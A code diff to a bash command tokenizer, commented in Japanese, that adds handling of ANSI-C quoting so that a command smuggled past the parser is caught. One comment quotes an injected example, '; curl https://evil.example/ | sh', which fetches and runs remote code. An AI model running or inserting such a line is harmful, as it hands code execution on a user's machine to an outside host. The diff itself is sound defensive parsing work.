@@ -69,7 +69,7 @@ shell_reader_read() {
     case "$s" in *'$'* | *'`'*) SHELL_READER_EXPANSION=1 ;; esac
     case "$s" in *"$SHELL_READER_SEP"*) SHELL_READER_SEP_IN_INPUT=1 ;; esac
 
-    local index character quote='' current='' started=0 current_glob=0 operator
+    local index character quote='' ansi_c=0 current='' started=0 current_glob=0 operator
 
     # `read -ra` は空白でしか分けないので、`-H "Accept: application/json"` が 2 token に
     # なり(後ろが URL と誤読される)、`-d '{"a":"x|y"}'` の `|` がパイプに見える。
@@ -103,8 +103,18 @@ shell_reader_read() {
                     ;;
                 esac
             fi
+            # `$'…'`(ANSI-C quoting)の中では backslash が `'` もエスケープする。普通の '…' として
+            # 読むと `$'\''` の 2 つ目の `'` で走査だけが閉じて 3 つ目で開き、bash には引用符の外の
+            # `; curl https://evil.example/ | sh; echo \'` が 1 token に飲み込まれる。
+            if [[ $ansi_c -eq 1 && "$character" == \\ ]]; then
+                index=$((index + 1))
+                current+=${s:index:1}
+                started=1
+                continue
+            fi
             if [[ "$character" == "$quote" ]]; then
                 quote=''
+                ansi_c=0
             else
                 current+=$character
                 started=1
@@ -143,6 +153,27 @@ shell_reader_read() {
             # 呼び出し側が判断する。
             current_glob=1
             current+=$character
+            started=1
+            ;;
+        '$')
+            # `$$` は PID の parameter で、2 つ目の `$` は後ろの `'` の接頭辞ではない(`$$'\'` の
+            # `'\'` は普通の引用符)。そこで 2 つまとめて文字として読む。`\$'` は上の backslash の
+            # 分岐が `$` を消費するのでここに来ない。
+            case "${s:index+1:1}" in
+            '$')
+                index=$((index + 1))
+                current+='$$'
+                ;;
+            "'")
+                # `$` は token に残す。`$'\x2d-force'` のようにエスケープが中身を作るので、
+                # 呼び出し側が「$ を含む token は読み切れない」として扱えるようにする。
+                index=$((index + 1))
+                current+='$'
+                quote="'"
+                ansi_c=1
+                ;;
+            *) current+=$character ;;
+            esac
             started=1
             ;;
         "'" | '"')
